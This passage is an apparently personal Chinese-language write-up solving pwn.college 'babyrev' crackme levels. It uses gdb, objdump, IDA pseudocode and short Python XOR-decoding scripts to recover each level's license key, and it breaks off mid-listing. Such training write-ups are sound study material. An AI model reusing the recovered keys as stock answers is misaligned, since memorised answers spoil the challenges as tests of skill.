<p>wp：首先尝试直接运行，但是发现不回显正确字符串，于是使用gdb进行调试，但是<code>disas main</code>无法查看汇编指令，对<code>main</code>下断点也失败。尝试使用<code>objdump -M intel -d /challenge/babyrev_level1.1 &gt; level1_1</code>反汇编目标文件并将汇编代码保存到<code>level1_1</code>中，大致浏览一下代码看看重要函数，发现<code>memcmp</code>函数，下面是该函数的分析</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">memcmp</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *s1, <span class="type">const</span> <span class="type">void</span> *s2, <span class="type">size_t</span> n)</span>;</span><br><span class="line">- s1：指向第一个内存块的指针。</span><br><span class="line">- s2：指向第二个内存块的指针。</span><br><span class="line">- n：要比较的字节数。</span><br></pre></td></tr></tbody></table></figure>
<p>反汇编得到的代码中没有真实地址，需要运行才能得到，参考大佬的<a target="_blank" rel="noopener" href="https://tech.c01dkit.com/pwn-college-cse365-spring2023/#reverse-engineering-writeups">wp</a>，首先通过gdb运行程序在输入环节直接截停(ctrl+c)程序，然后通过<code>bt</code>命令查看函数调用栈，得到：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">0  0x00007fb965acf1f2 <span class="keyword">in</span> __GI___libc_read (fd=0, buf=0x7ffe3d7e8e92, nbytes=5)</span></span><br><span class="line">    at ../sysdeps/unix/sysv/linux/read.c:26</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1  0x000055b29983a535 <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2  0x00007fb9659e5083 <span class="keyword">in</span> __libc_start_main (main=0x55b29983a412, argc=1, argv=0x7ffe3d7e8f98,</span></span><br><span class="line">    init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7ffe3d7e8f88)</span><br><span class="line">    at ../csu/libc-start.c:308</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3  0x000055b29983a22e <span class="keyword">in</span> ?? ()</span></span><br></pre></td></tr></tbody></table></figure>
<p>然后使用<code>x/80i 0x55b29983a412</code>查看<code>main</code>的内容，找到<code>memcmp</code>函数：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x55b29983a541:      lea    rax,[rbp-0xe]</span><br><span class="line">0x55b29983a545:      mov    edx,0x5</span><br><span class="line">0x55b29983a54a:      lea    rsi,[rip+0x2abf]        # 0x55b29983d010</span><br><span class="line">0x55b29983a551:      mov    rdi,rax</span><br><span class="line">0x55b29983a554:      call   0x55b29983a1b0 &lt;memcmp@plt&gt;</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<p><code>rsi</code>中存放的就是flag的地址即注释中的地址，使用<code>x/5c 0x55b29983d010</code>得到正确字符串：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x55b29983d010: 104 'h' 103 'g' 115 's' 97 'a'  97 'a'</span><br></pre></td></tr></tbody></table></figure>
<p>然后退出gdb重新运行程序，输入正确字符串，得到flag</p>
<ul>
<li><p>level2.0：字符串比较前被修改过。</p>
<p>wp：首先根据回显得到目标字符串<code>zdniz</code>，但是输入该字符串无法得到flag，于是使用gdb调试，在<code>memcmp</code>
处下断点，然后运行至该处，查看被比较的两个字符串，发现我输入的字符串中第三个和第四个字符顺序对调了，所以在输入时将这两个字符顺序对调即可得到flag</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/5c $rdi</span><br><span class="line">0x7ffda4747842: 122 'z' 100 'd' 105 'i' 110 'n' 122 'z'</span><br><span class="line">(gdb) x/5c $rsi</span><br><span class="line">0x5605e890c010 &lt;EXPECTED_RESULT&gt;:       122 'z' 100 'd' 110 'n' 105 'i' 122 'z'</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level2.1：思路同1.1</p>
<p>wp：运行程序不回显正确字符串，运行gdb无法使用<code>disas main</code>，所以使用1.1的思路，首先在gdb中<code>run</code>，然后不输入字符串直接<code>ctrl+c</code>停止运行，使用<code>bt</code>查看栈中函数：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">0  0x00007fc3682811f2 <span class="keyword">in</span> <span class="built_in">read</span> () from /lib/x86_64-linux-gnu/libc.so.6</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1  0x000055fafae44535 <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2  0x00007fc368197083 <span class="keyword">in</span> __libc_start_main () from /lib/x86_64-linux-gnu/libc.so.6</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3  0x000055fafae4422e <span class="keyword">in</span> ?? ()</span></span><br></pre></td></tr></tbody></table></figure>
<p>首先查看<code>__libc_start_main</code>函数，没发现特殊函数，也没显示参数。然后我就在这卡住了，于是尝试<code>x/15i 0x000055fafae44535</code>（<code>read</code>函数下面的<code>??</code>函数），发现<code>memcmp</code>函数：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x55fafae44535:      movzx  eax,BYTE PTR [rbp-0xd]</span><br><span class="line">0x55fafae44539:      mov    BYTE PTR [rbp-0x10],al</span><br><span class="line">0x55fafae4453c:      movzx  eax,BYTE PTR [rbp-0xb]</span><br><span class="line">0x55fafae44540:      mov    BYTE PTR [rbp-0xf],al</span><br><span class="line">0x55fafae44543:      movzx  eax,BYTE PTR [rbp-0xf]</span><br><span class="line">0x55fafae44547:      mov    BYTE PTR [rbp-0xd],al</span><br><span class="line">0x55fafae4454a:      movzx  eax,BYTE PTR [rbp-0x10]</span><br><span class="line">0x55fafae4454e:      mov    BYTE PTR [rbp-0xb],al</span><br><span class="line">0x55fafae44551:      lea    rdi,[rip+0xdb0]        # 0x55fafae45308</span><br><span class="line">0x55fafae44558:      call   0x55fafae44140 &lt;puts@plt&gt;</span><br><span class="line">0x55fafae4455d:      lea    rax,[rbp-0xe]</span><br><span class="line">0x55fafae44561:      mov    edx,0x5</span><br><span class="line">0x55fafae44566:      lea    rsi,[rip+0x2aa3]        # 0x55fafae47010</span><br><span class="line">0x55fafae4456d:      mov    rdi,rax</span><br><span class="line">0x55fafae44570:      call   0x55fafae441b0 &lt;memcmp@plt&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>接着设置断点，查看相关寄存器或内存的内容，详细步骤如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b *0x55fafae44570</span><br><span class="line">Breakpoint 1 at 0x55fafae44570</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">zalf    # 注意这里我只输入了4个字符，因为回车也算一个字符，若输入5个字符则会跳过断点</span><br><span class="line">Checking the received license key!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x000055fafae44570 in ?? ()</span><br><span class="line">(gdb) x/5c 0x55fafae47010</span><br><span class="line">0x55fafae47010: 122 'z' 97 'a'  108 'l' 102 'f' 109 'm'</span><br><span class="line">(gdb) x/5c $rbp-0xe</span><br><span class="line">0x7fff3386c952: 122 'z' 102 'f' 108 'l' 97 'a'  10 '\n'</span><br></pre></td></tr></tbody></table></figure>
<p>得到目标字符串<code>zalfm</code>，发现我输入的字符串中第二个和第四个字符顺序对调，退出gdb，重新运行目标程序，输入字符串<code>zflam</code>，回车得到flag</p></li>
<li><p>level3.0：思路同2.0</p>
<p>wp：逆序输入字符串</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/5c 0x55f839045010</span><br><span class="line">0x55f839045010 &lt;EXPECTED_RESULT&gt;: 109 'm' 111 'o' 114 'r' 106 'j' 116 't'</span><br><span class="line">(gdb) x/5c $rbp-0xe</span><br><span class="line">0x7fff5d8dea92: 116 't' 106 'j' 114 'r' 111 'o' 109 'm'</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level3.1：同2.1</p></li>
<li><p>level4.0：同2.0，没发现字符串被修改了</p></li>
<li><p>level4.1：同2.1，按照ASCii码表的顺序修改？</p></li>
<li><p>level5.0：运行目标程序，任意输入五个字符，得到提示</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This challenge is now mangling your input using the `xor` mangler with key `0x64`</span><br></pre></td></tr></tbody></table></figure>
<p>wp：只需要将目标十六进制与<code>0x64</code>进行异或即可得到正确字符串</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">0x0b</span>, <span class="number">0x0e</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x12</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s)):</span><br><span class="line">	s[i] = <span class="built_in">chr</span>(s[i] ^ <span class="number">0x64</span>)</span><br><span class="line"><span class="built_in">print</span>(s)  <span class="comment"># ojsvv</span></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level5.1：同5.0</p>
<p>wp：步骤同2.1，先找到正确的字符串，得到下面的结果，并不是常见的ASCii码</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 使用 x/5c 0x5582accad010</span><br><span class="line">0x55c7c5bfa010: -80 '\260'  -93 '\243'  -93 '\243'  -88 '\250'  -91 '\245'</span><br><span class="line"># 十进制（有符号整数）：负数值</span><br><span class="line"># 字符表示：对应的 ASCII 字符，用八进制表示（\xxx）</span><br><span class="line"></span><br><span class="line"># 或者使用 x/5bx 0x5582accad010 得到下面结果</span><br><span class="line">0x5582accad010: 0xb0    0xa3    0xa3    0xa8    0xa5</span><br></pre></td></tr></tbody></table></figure>
<p>然后按照之前的步骤，找到关键代码：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0x55c7c5bf7535:      mov    DWORD PTR [rbp-0x14],0x0</span><br><span class="line">0x55c7c5bf753c:      jmp    0x55c7c5bf755b</span><br><span class="line">0x55c7c5bf753e:      mov    eax,DWORD PTR [rbp-0x14]</span><br><span class="line">0x55c7c5bf7541:      cdqe</span><br><span class="line">0x55c7c5bf7543:      movzx  eax,BYTE PTR [rbp+rax*1-0xe]</span><br><span class="line">0x55c7c5bf7548:      xor    eax,0xffffffd1</span><br><span class="line">0x55c7c5bf754b:      mov    edx,eax</span><br><span class="line">0x55c7c5bf754d:      mov    eax,DWORD PTR [rbp-0x14]</span><br><span class="line">0x55c7c5bf7550:      cdqe</span><br><span class="line">0x55c7c5bf7552:      mov    BYTE PTR [rbp+rax*1-0xe],dl</span><br><span class="line">0x55c7c5bf7556:      nop</span><br><span class="line">0x55c7c5bf7557:      add    DWORD PTR [rbp-0x14],0x1</span><br><span class="line">0x55c7c5bf755b:      cmp    DWORD PTR [rbp-0x14],0x4</span><br><span class="line">0x55c7c5bf755f:      jle    0x55c7c5bf753e</span><br><span class="line">0x55c7c5bf7561:      lea    rdi,[rip+0xda0]        # 0x55c7c5bf8308</span><br><span class="line">0x55c7c5bf7568:      call   0x55c7c5bf7140 &lt;puts@plt&gt;</span><br><span class="line">0x55c7c5bf756d:      lea    rax,[rbp-0xe]</span><br><span class="line">0x55c7c5bf7571:      mov    edx,0x5</span><br><span class="line">0x55c7c5bf7576:      lea    rsi,[rip+0x2a93]        # 0x55c7c5bfa010</span><br><span class="line">0x55c7c5bf757d:      mov    rdi,rax</span><br><span class="line">0x55c7c5bf7580:      call   0x55c7c5bf71b0 &lt;memcmp@plt&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>分析上述代码，可知输入的每个字符都进行了异或操作，循环5次（共5个字符），参与异或的立即数是<code>0xffffffd1</code>，是32位整数，但是最终只要求8位（1字节），所以脚本如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0xb0</span>, <span class="number">0xa3</span>, <span class="number">0xa3</span>, <span class="number">0xa8</span>, <span class="number">0xa5</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">	s1[i] = <span class="built_in">chr</span>(s1[i] ^ <span class="number">0xffffffd1</span> &amp; <span class="number">0xff</span>)  <span class="comment"># 0xff 是为了获取低8位</span></span><br><span class="line"><span class="built_in">print</span>(s1)</span><br></pre></td></tr></tbody></table></figure>
<p>或者使用十进制进行计算（不推荐，涉及到负数和补码）</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = [-<span class="number">80</span>, -<span class="number">93</span>, -<span class="number">93</span>, -<span class="number">88</span>, -<span class="number">91</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s)):</span><br><span class="line">	s[i] = <span class="built_in">chr</span>(s[i] ^ -<span class="number">47</span>) </span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level6.0：简单</p>
<p>wp：直接运行，得到目标字符串的十六进制，转换为ASCII码，再次运行，输入正确字符串得到flag</p></li>
<li><p>level6.1：同5.1</p>
<p>wp：首先找到关键代码，发现目标字符串有18个字符，剩下的步骤与5.1相同</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0xcc</span>,<span class="number">0xd4</span>,<span class="number">0xd7</span>,<span class="number">0xc9</span>,<span class="number">0xd9</span>,<span class="number">0xd9</span>,<span class="number">0xd9</span>,<span class="number">0xcd</span>,<span class="number">0xcd</span>,<span class="number">0xdf</span>,<span class="number">0xd2</span>,<span class="number">0xcd</span>,<span class="number">0xd1</span>,<span class="number">0xda</span>,<span class="number">0xd9</span>,<span class="number">0xce</span>,<span class="number">0xd9</span>,<span class="number">0xd6</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">	flag += <span class="built_in">chr</span>(s1[i] ^ <span class="number">0xffffffbb</span> &amp; <span class="number">0xff</span>) </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level7.0：运行目标程序，任意输入字符串，得到提示</p>
<p>wp：根据提示一步一步编写脚本，注意这里的异或操作，不是将每个字节与每个立即数进行异或，而是每个字节对应立即数的其中一个字节进行异或</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0x5c</span>, <span class="number">0x6d</span>, <span class="number">0xf2</span>, <span class="number">0x49</span>, <span class="number">0x94</span>, <span class="number">0x37</span>, <span class="number">0xa9</span>, <span class="number">0x5a</span>, <span class="number">0x51</span>, <span class="number">0xf1</span>, <span class="number">0xf0</span>, <span class="number">0x0f</span>, <span class="number">0x49</span>, <span class="number">0x30</span>, <span class="number">0x2f</span>, <span class="number">0x4b</span>, <span class="number">0x09</span>, <span class="number">0x2e</span>, <span class="number">0xfe</span>, <span class="number">0x97</span>, <span class="number">0x51</span>, <span class="number">0x6f</span>, <span class="number">0xf4</span>, <span class="number">0x5e</span>, <span class="number">0x9e</span>, <span class="number">0x3f</span>, <span class="number">0xa6</span>, <span class="number">0x51</span>, <span class="number">0x50</span>]</span><br><span class="line">s2 = [<span class="number">0xc68dc3ca1f</span>, <span class="number">0xc899</span>, <span class="number">0x2be19206</span>, <span class="number">0x11f1047f</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s2)):</span><br><span class="line">	length = <span class="built_in">round</span>(s2[j].bit_length()/<span class="number">8</span>)  <span class="comment"># 获取字节数</span></span><br><span class="line">	<span class="built_in">print</span>(length)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">		s1[i] = s1[i] ^ (s2[j] &gt;&gt; ((length-<span class="number">1</span> - i%length)*<span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">		<span class="comment">#flag += chr(s1[i] ^ 0xc68dc3ca1f ^ 0xc899 ^ 0x2be19206 ^ 0x11f1047f )</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">	flag += <span class="built_in">chr</span>(s1[i])</span><br><span class="line">	<span class="comment">#print(hex(s1[i]))</span></span><br><span class="line">flag = <span class="built_in">list</span>(flag)</span><br><span class="line">tmp = flag[<span class="number">2</span>]</span><br><span class="line">flag[<span class="number">2</span>] =  flag[<span class="number">12</span>]</span><br><span class="line">flag[<span class="number">12</span>] = tmp</span><br><span class="line"><span class="built_in">print</span>(<span class="string">''</span>.join(flag))</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level7.1：要求同上</p>
<p>wp：静态与动态调试相结合，首先通过之前的方法用gdb找到正确的答案</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x55c058051010: 0x40    0xf3    0x82    0xd6    0x9b    0x57    0xe2    0x98</span><br><span class="line">0x55c058051018: 0xdf    0x6f    0x5b    0xf3    0x9c    0xd6    0x7e    0x68</span><br><span class="line">0x55c058051020: 0xff    0x94    0xd0    0x68    0x52    0xfd    0x63    0xc5</span><br><span class="line">0x55c058051028: 0x52    0x4a    0xe6    0x9b    0xc3</span><br></pre></td></tr></tbody></table></figure>
<p>接着阅读汇编尝试理解逻辑，发现有难度，于是尝试使用<strong>IDA</strong>，找到<code>main</code>函数（通过start找到main函数），然后通过<strong>反编译</strong>（F5键）得到伪代码：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [rsp+2Ch] [rbp-44h]</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+2Eh] [rbp-42h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+30h] [rbp-40h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+32h] [rbp-3Eh]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+34h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+38h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+3Ch] [rbp-34h]</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+48h] [rbp-28h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  __int16 v14; <span class="comment">// [rsp+5Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v15; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">0</span> )</span><br><span class="line">    __assert_fail(<span class="string">"argc &gt; 0"</span>, <span class="string">"&lt;stdin&gt;"</span>, <span class="number">0x32</span>u, <span class="string">"main"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"###"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"### Welcome to %s!\n"</span>, *a2);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"###"</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">"This license verifier software will allow you to read the flag. However, before you can do so, you must verify that you"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"are licensed to read flag files! This program consumes a license key over stdin. Each program may perform entirely"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">"different operations on that input! You must figure out (by reverse engineering this program) what that license key is."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Providing the correct license key will net you the flag!\n"</span>);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Ready to receive your license key!\n"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x1D</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">13</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    v6 = *((_BYTE *)&amp;buf + i);</span><br><span class="line">    *((_BYTE *)&amp;buf + i) = *((_BYTE *)&amp;buf + <span class="number">28</span> - i);</span><br><span class="line">    *((_BYTE *)&amp;buf + <span class="number">28</span> - i) = v6;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">28</span>; ++j )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">switch</span> ( j % <span class="number">5</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + j) ^= <span class="number">0xB4</span>u;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + j) ^= <span class="number">0xEC</span>u;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + j) ^= <span class="number">0x96</span>u;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + j) ^= <span class="number">0x33</span>u;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + j) ^= <span class="number">0xA</span>u;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">13</span>; ++k )</span><br><span class="line">  {</span><br><span class="line">    v5 = *((_BYTE *)&amp;buf + k);</span><br><span class="line">    *((_BYTE *)&amp;buf + k) = *((_BYTE *)&amp;buf + <span class="number">28</span> - k);</span><br><span class="line">    *((_BYTE *)&amp;buf + <span class="number">28</span> - k) = v5;</span><br><span class="line">  }</span><br><span class="line">  v3 = HIBYTE(v11);</span><br><span class="line">  HIBYTE(v11) = v13;</span><br><span class="line">  LOBYTE(v13) = v3;</span><br><span class="line">  v4 = BYTE4(buf);</span><br><span class="line">  BYTE4(buf) = BYTE6(v12);</span><br><span class="line">  BYTE6(v12) = v4;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Checking the received license key!\n"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;buf, &amp;unk_4010, <span class="number">0x1D</span>uLL) )</span><br><span class="line">  {</span><br><span class="line">    sub_12E9();</span><br><span class="line">    <span class="built_in">exit</span>(<span 